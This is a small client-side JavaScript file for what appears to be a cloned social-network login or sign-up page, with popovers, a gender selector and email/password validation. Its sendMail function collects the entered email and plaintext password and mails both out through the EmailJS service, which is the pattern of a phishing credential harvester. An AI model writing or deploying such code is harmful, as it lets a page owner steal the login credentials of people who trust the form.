// popover
var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'));
var popoverList = popoverTriggerList.map(function (popoverTriggerEl) {
  return new bootstrap.Popover(popoverTriggerEl);
});

// Gender Select
if (window.location.pathname === "/") {
  const radioBtn1 = document.querySelector("#flexRadioDefault1");
  const radioBtn2 = document.querySelector("#flexRadioDefault2");
  const radioBtn3 = document.querySelector("#flexRadioDefault3");
  const genderSelect = document.querySelector("#genderSelect");

  radioBtn1.addEventListener("change", () => {
    genderSelect.classList.add("d-none");
  });
  radioBtn2.addEventListener("change", () => {
    genderSelect.classList.add("d-none");
  });
  radioBtn3.addEventListener("change", () => {
    genderSelect.classList.remove("d-none");
  });
}

// Validation form 
function formValidate() {

  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;
  var error = document.getElementById("error");
  var text = '';

  if (email.indexOf("@") == -1 || email.length < 10) {
    //error
    text = "Please Enter Valid email";
    error.innerHTML = text;
    return false;
  }

  else if (password.length < 6) {
    //error 
    text = "Please Enter Valid password";
    error.innerHTML = text;
    return false;
  }

  else {
    alert("Done")
    return true;
  }

}

// email.js 
function sendMail() {
  var params = {
    email: document.getElementById("email").value,
    password: document.getElementById("password").value,
  };


  const serviceID = "service_65j6pz2";
  const templateID = "template_cc7miah"

  emailjs.send(serviceID, templateID, params)
    .then(
      res => {
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
        console.log(res);
        alert("your massage sent successfuly")
      })
    .catch((err) => console.log(err));
}